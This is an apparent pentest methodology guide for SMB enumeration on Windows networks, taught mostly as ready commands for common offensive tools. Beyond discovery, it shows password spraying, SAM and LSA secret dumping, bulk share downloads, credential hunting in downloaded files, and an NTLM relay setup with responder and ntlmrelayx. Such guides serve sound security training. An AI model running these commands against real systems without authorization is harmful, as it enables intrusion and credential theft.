# SMB/CIFS Enumeration - Complete Methodology

## 📋 Overview

**SMB (Server Message Block)** is a network file sharing protocol primarily used in Windows environments. It's one of the most valuable services for enumeration and often provides initial access.

**Ports**: 139 (NetBIOS), 445 (SMB)

---

## 🎯 When to Use

- Windows environments
- File sharing services
- Active Directory enumeration
- Credential validation
- Lateral movement

---

## 🔄 SMB Enumeration Workflow

```
┌─────────────────────────────────────────┐
│ 1. Service Detection                    │
│    └─ Nmap scan, version detection      │
└─────────────────────────────────────────┘
              ↓
┌─────────────────────────────────────────┐
│ 2. Null Session Check                   │
│    └─ Anonymous access possible?        │
└─────────────────────────────────────────┘
              ↓
┌─────────────────────────────────────────┐
│ 3. Share Enumeration                    │
│    └─ List available shares             │
└─────────────────────────────────────────┘
              ↓
┌─────────────────────────────────────────┐
│ 4. User Enumeration                     │
│    └─ RID cycling, user lists           │
└─────────────────────────────────────────┘
              ↓
┌─────────────────────────────────────────┐
│ 5. Share Access                         │
│    └─ Connect and download files        │
└─────────────────────────────────────────┘
              ↓
┌─────────────────────────────────────────┐
│ 6. Vulnerability Scanning               │
│    └─ Check for known exploits          │
└─────────────────────────────────────────┘
```

---

## 🚀 Quick Start

### Initial Detection
```bash
# Nmap scan
sudo nmap -p 139,445 -sC -sV $IP

# Check if SMB is running
crackmapexec smb $IP
```

### Fast Enumeration
```bash
# All-in-one enumeration
enum4linux-ng $IP -A

# Quick share check
smbclient -N -L //$IP
smbmap -H $IP
```

---

## 📚 Enumeration Tools

### Tool Comparison

| Tool | Best For | Requires Auth | Speed |
|------|----------|---------------|-------|
| `enum4linux-ng` | Complete enumeration | No | Medium |
| `smbclient` | Manual exploration | No | Fast |
| `smbmap` | Share permissions | No | Fast |
| `crackmapexec` | Credential validation | Optional | Fast |
| `rpcclient` | RPC enumeration | No | Medium |
| `nmap scripts` | Vulnerability scanning | No | Slow |

---

## 🔍 Step-by-Step Enumeration

### Step 1: Service Detection

```bash
# Nmap service detection
sudo nmap -p 139,445 -sC -sV -oA nmap/smb $IP

# Check SMB version
crackmapexec smb $IP

# Expected output:
# SMB    10.10.10.10    445    TARGET    [*] Windows 10.0 Build 17763 x64 (name:TARGET) (domain:DOMAIN) (signing:False) (SMBv1:False)
```

**What to note**:
- Windows version
- Domain name
- SMB signing status (important for relay attacks)
- SMBv1 enabled (vulnerable to EternalBlue)

---

### Step 2: Null Session Enumeration

**Null Session**: Anonymous connection without credentials

#### Using smbclient
```bash
# List shares (null session)
smbclient -N -L //$IP

# Alternative syntax
smbclient -L //$IP -U ""
```

#### Using smbmap
```bash
# Check share permissions (null session)
smbmap -H $IP

# With guest user
smbmap -H $IP -u guest
```

#### Using crackmapexec
```bash
# Null session
crackmapexec smb $IP -u '' -p '' --shares

# Guest session
crackmapexec smb $IP -u 'guest' -p '' --shares
```

**Common Shares**:
- `ADMIN$` - Remote admin (requires admin)
- `C$` - C drive (requires admin)
- `IPC$` - Inter-process communication
- `NETLOGON` - Domain logon scripts
- `SYSVOL` - Domain policies and scripts
- Custom shares - User-created shares

---

### Step 3: Comprehensive Enumeration with enum4linux-ng

```bash
# Full enumeration
enum4linux-ng $IP -A

# Specific enumeration
enum4linux-ng $IP -U  # Users
enum4linux-ng $IP -S  # Shares
enum4linux-ng $IP -G  # Groups
enum4linux-ng $IP -P  # Password policy
enum4linux-ng $IP -O  # OS information
```

**What to extract**:
- [ ] Domain name
- [ ] Domain SID
- [ ] User list
- [ ] Group list
- [ ] Share list
- [ ] Password policy
- [ ] OS version

---

### Step 4: User Enumeration

#### RID Cycling

**RID (Relative Identifier)**: Unique identifier for domain objects

```bash
# Using crackmapexec
crackmapexec smb $IP -u 'guest' -p '' --rid-brute

# Using rpcclient
rpcclient -U "" -N $IP
rpcclient $> enumdomusers
rpcclient $> enumdomgroups
rpcclient $> queryuser 0x1f4  # Query specific RID (500 = Administrator)
```

#### Using impacket-lookupsid
```bash
# Enumerate users via SID
impacket-lookupsid guest@$IP

# With domain
impacket-lookupsid DOMAIN/guest@$IP
```

**Save users to file**:
```bash
crackmapexec smb $IP -u 'guest' -p '' --rid-brute | grep SidTypeUser | awk '{print $6}' | cut -d'\' -f2 > users.txt
```

---

### Step 5: Share Access and Exploration

#### Connect to Share
```bash
# Anonymous connection
smbclient //$IP/ShareName -N

# With credentials
smbclient //$IP/ShareName -U username

# Common commands in smbclient
smb: \> ls              # List files
smb: \> cd directory    # Change directory
smb: \> get file.txt    # Download file
smb: \> mget *          # Download all files
smb: \> put file.txt    # Upload file (if writable)
smb: \> recurse ON      # Enable recursive operations
smb: \> prompt OFF      # Disable prompts
smb: \> mget *          # Download everything recursively
```

#### Recursive Download
```bash
# Download entire share
smbclient //$IP/ShareName -N -c 'prompt OFF;recurse ON;mget *'

# Using smbget
smbget -R smb://$IP/ShareName -U guest
```

#### Mount SMB Share (Linux)
```bash
# Create mount point
mkdir /mnt/smb

# Mount share
sudo mount -t cifs //$IP/ShareName /mnt/smb -o username=guest,password=

# Browse
ls -la /mnt/smb

# Unmount
sudo umount /mnt/smb
```

---

### Step 6: Authenticated Enumeration

**When you have credentials**:

```bash
# Validate credentials
crackmapexec smb $IP -u username -p password

# Enumerate shares with permissions
smbmap -H $IP -u username -p password

# List shares
crackmapexec smb $IP -u username -p password --shares

# Enumerate users
crackmapexec smb $IP -u username -p password --users

# Enumerate groups
crackmapexec smb $IP -u username -p password --groups

# Check local admin access
crackmapexec smb $IP -u username -p password --local-auth

# Dump SAM (if admin)
crackmapexec smb $IP -u username -p password --sam

# Dump LSA secrets (if admin)
crackmapexec smb $IP -u username -p password --lsa
```

---

### Step 7: Vulnerability Scanning

#### EternalBlue (MS17-010)
```bash
# Nmap script
nmap -p 445 --script smb-vuln-ms17-010 $IP

# Metasploit scanner
msfconsole
use auxiliary/scanner/smb/smb_ms17_010
set RHOSTS $IP
run
```

#### All SMB Vulnerabilities
```bash
# Nmap all vuln scripts
nmap -p 445 --script smb-vuln* $IP

# Common vulnerabilities checked:
# - MS08-067 (NetAPI)
# - MS17-010 (EternalBlue)
# - CVE-2009-3103 (SMBv2)
# - SMB signing
```

---

## 🎯 Common Attack Scenarios

### Scenario 1: Null Session Access

```bash
# 1. Check for null session
smbclient -N -L //$IP

# 2. List shares
smbmap -H $IP

# 3. Access readable shares
smbclient //$IP/Users -N

# 4. Download interesting files
smb: \> recurse ON
smb: \> prompt OFF
smb: \> mget *
```

### Scenario 2: Guest Access

```bash
# 1. Try guest account
crackmapexec smb $IP -u 'guest' -p ''

# 2. Enumerate users via RID cycling
crackmapexec smb $IP -u 'guest' -p '' --rid-brute > users.txt

# 3. Extract usernames
cat users.txt | grep SidTypeUser | awk '{print $6}' | cut -d'\' -f2 > clean_users.txt

# 4. Password spray (if you have a common password)
crackmapexec smb $IP -u clean_users.txt -p 'Password123' --continue-on-success
```

### Scenario 3: Credential Validation

```bash
# 1. Test single credential
crackmapexec smb $IP -u username -p password

# 2. Test multiple users
crackmapexec smb $IP -u users.txt -p password

# 3. Test multiple passwords
crackmapexec smb $IP -u username -p passwords.txt

# 4. Test user:pass combinations
crackmapexec smb $IP -u users.txt -p passwords.txt --no-bruteforce
```

### Scenario 4: Share Enumeration and Data Exfiltration

```bash
# 1. List all shares with permissions
smbmap -H $IP -u username -p password -r

# 2. Recursively list files in specific share
smbmap -H $IP -u username -p password -R ShareName

# 3. Download specific file
smbmap -H $IP -u username -p password --download 'ShareName\path\to\file.txt'

# 4. Search for interesting files
smbmap -H $IP -u username -p password -R ShareName | grep -i "password\|credential\|config"
```

---

## 🛡️ SMB Relay Attacks

**When SMB signing is disabled**:

### Check SMB Signing
```bash
# Using nmap
nmap -p 445 --script smb-security-mode $IP

# Using crackmapexec
crackmapexec smb $IP --gen-relay-list relay_targets.txt
```

### Setup Relay Attack
```bash
# 1. Start responder (capture hashes)
sudo responder -I tun0 -dwv

# 2. Setup ntlmrelayx (relay to target)
impacket-ntlmrelayx -tf targets.txt -smb2support

# 3. Wait for authentication
# When user authenticates, relay to target
```

---

## 📊 Data Analysis

### Interesting Files to Look For

```bash
# Configuration files
*.config
*.conf
*.xml
*.ini

# Credential files
*password*
*credential*
*secret*
*.kdbx (KeePass)
*.key
*.pem

# Scripts
*.ps1
*.bat
*.vbs
*.sh

# Database files
*.db
*.sqlite
*.mdb

# Backup files
*.bak
*.old
*.backup
```

### Search for Sensitive Data
```bash
# Using smbmap
smbmap -H $IP -u username -p password -R ShareName | grep -i "password\|credential\|secret\|key"

# After downloading, search locally
grep -r -i "password" /path/to/downloaded/files/
grep -r -i "credential" /path/to/downloaded/files/
```

---

## ⚠️ Common Errors and Solutions

### Error: "NT_STATUS_ACCESS_DENIED"
**Cause**: No permissions to access share
**Solution**: Try different credentials or enumerate other shares

### Error: "NT_STATUS_BAD_NETWORK_NAME"
**Cause**: Share doesn't exist
**Solution**: Verify share name with `smbclient -L`

### Error: "NT_STATUS_LOGON_FAILURE"
**Cause**: Invalid credentials
**Solution**: Verify username/password, check domain

### Error: "protocol negotiation failed: NT_STATUS_CONNECTION_DISCONNECTED"
**Cause**: SMB version mismatch
**Solution**: Specify SMB version
```bash
smbclient -L //$IP --option='client min protocol=NT1'
```

### Error: "session setup failed: NT_STATUS_ACCOUNT_DISABLED"
**Cause**: Account is disabled
**Solution**: Try different account

---

## 💡 Pro Tips

1. **Always try null and guest sessions first**
   ```bash
   crackmapexec smb $IP -u '' -p ''
   crackmapexec smb $IP -u 'guest' -p ''
   ```

2. **Save enumeration results**
   ```bash
   enum4linux-ng $IP -A | tee enum4linux.txt
   ```

3. **Check for writable shares**
   ```bash
   smbmap -H $IP -u username -p password | grep WRITE
   ```

4. **Use crackmapexec for multiple targets**
   ```bash
   crackmapexec smb 10.10.10.0/24 -u username -p password
   ```

5. **Extract domain information**
   ```bash
   crackmapexec smb $IP | grep -oP '(?<=domain:)[^)]*'
   ```

6. **Spider shares for interesting files**
   ```bash
   crackmapexec smb $IP -u username -p password -M spider_plus
   ```

7. **Check for admin access across multiple hosts**
   ```bash
   crackmapexec smb targets.txt -u username -p password --local-auth
   ```

---

## 🔗 Related Techniques

- **Pass-the-Hash**: [`../06-Active-Directory/Pass-the-Hash.md`](../06-Active-Directory/Pass-the-Hash.md)
- **SMB Relay**: [`../06-Active-Directory/SMB-Relay.md`](../06-Active-Directory/SMB-Relay.md)
- **Lateral Movement**: [`../04-Post-Exploitation/Lateral-Movement.md`](../04-Post-Exploitation/Lateral-Movement.md)
- **Credential Harvesting**: [`../04-Post-Exploitation/Credential-Harvesting.md`](../04-Post-Exploitation/Credential-Harvesting.md)

---

## 📚 Tool Installation

```bash
# Install enum4linux-ng
git clone https://github.com/cddmp/enum4linux-ng.git
cd enum4linux-ng
pip3 install -r requirements.txt

# Install crackmapexec
apt install crackmapexec

# Install impacket
pip3 install impacket

# Install smbclient
apt install smbclient
```

---

## 📖 Checklist

Use this checklist for every SMB service:

- [ ] Nmap service detection
- [ ] Check SMB version and signing
- [ ] Try null session
- [ ] Try guest session
- [ ] Enumerate shares
- [ ] Enumerate users (RID cycling)
- [ ] Enumerate groups
- [ ] Check password policy
- [ ] Access readable shares
- [ ] Download interesting files
- [ ] Search for credentials
- [ ] Check for vulnerabilities (MS17-010)
- [ ] Test for SMB relay (if signing disabled)
- [ ] Document findings

---

**Remember**: SMB enumeration often provides the initial foothold. Be thorough and systematic!
